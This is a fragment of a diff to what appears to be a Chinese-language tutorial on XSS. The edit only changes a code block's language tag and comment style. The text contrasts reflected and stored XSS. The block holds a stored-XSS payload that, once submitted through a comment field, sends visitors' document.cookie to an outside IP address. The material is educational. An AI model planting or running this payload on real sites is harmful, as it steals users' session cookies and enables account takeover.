@@ -47,8 +47,8 @@ xss攻击的核心方式是脚本。这些脚本通常是javascript脚本，从�
 
 所以，反射型xss攻击一般需要用户手动触发，而存储型xss攻击却是能够自动触发的。一般来说，反射型xss攻击的危害要比存储型xss攻击的危害要小的多。
 
-```js
-// 比如通过评论输入框将下面代码提交，之后会执行下面代码
+```html
+ <!-- 比如通过评论输入框将下面代码提交，之后会执行下面代码 -->
 <script type="text/javascript">
 document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cookie) + "'>")
 </script>
